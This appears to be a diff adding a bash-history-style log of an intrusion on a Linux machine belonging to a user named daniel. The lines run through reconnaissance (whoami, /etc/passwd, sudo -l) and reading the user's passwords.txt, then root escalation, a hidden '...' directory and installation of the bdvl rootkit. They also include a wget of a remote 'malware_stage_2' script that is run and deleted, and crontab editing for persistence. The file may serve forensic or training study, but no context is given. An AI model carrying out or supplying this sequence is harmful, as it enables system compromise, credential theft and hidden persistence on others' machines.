@@ -1,0 +1,39 @@
+ps aux
+whoami
+uname -a
+id
+lsmod
+netstat -tulpn
+cat /etc/passwd
+cat /etc/os-release
+sudo -l
+w
+ls /home
+ls /home/daniel -a
+ls /home/daniel/Documents
+cat /home/daniel/Documents/passwords.txt
+su -
+mkdir /home/daniel/...
+sudo chown . daniel
+sudo chown daniel .
+mysql -p -u root
+git clone https://github.com/naworkcaj/bdvl
+cd bdvl
+./configure
+vi config
+make
+make install
+cd ..
+wget https://raw.githubusercontent.com/maddhacker1337/malware_stage_2/main/stage2.sh -O /tmp/out
+chmod +x /tmp/out ; /tmp/out
+rm /tmp/out
+cd /home/daniel/...
+ps aux |grep sshd
+sudo service sshd retart
+sudo service ssh retart
+sudo service ssh stop
+sudo service ssh start
+crontab -l
+ls /var/spool/cron
+cat /var/spool/cron/crontabs/
+sudo vi /var/spool/cron/crontabs/daniel
